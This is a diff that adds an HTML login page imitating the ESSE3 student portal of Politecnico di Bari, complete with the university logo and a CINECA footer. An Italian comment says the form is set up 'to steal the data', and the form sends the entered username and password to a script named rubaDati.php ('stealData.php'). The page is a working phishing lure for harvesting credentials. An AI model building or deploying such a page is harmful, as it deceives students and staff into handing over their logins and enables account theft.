@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Accedi - ESSE3</title>
+        <link rel="icon" href="img/poliba_logo.png">
+        <link rel="stylesheet" href="css/myStyle.css" type="text/css">
+    </head>
+    <body>
+        <div class="navbar_iniziale">
+            <img src="img/poliba_navbar.jpg">
+        </div>
+
+        <div class="heading_login_box">
+            Accedi ad <b>ESSE3</b>
+        </div>
+
+        <div class="login_box">  
+            <!-- Imposto il form per rubare i dati -->
+            <form action="rubaDati.php" method="POST"> 
+                <div class="container">
+                    <label for="uname"><b>Username</b></label>
+                    <input type="text" name="uname" required>
+                
+                    <label for="psw"><b>Password</b></label>
+                    <input type="password" name="psw" required>
+                
+                    <button type="submit">Accedi</button>
+                  </div> 
+            </form>     
+        </div>
+
+        <div class="footer">
+            <p>Informativa utilizzo cookie | © CINECA</p>
+          </div>
+    </body>   
+</html>
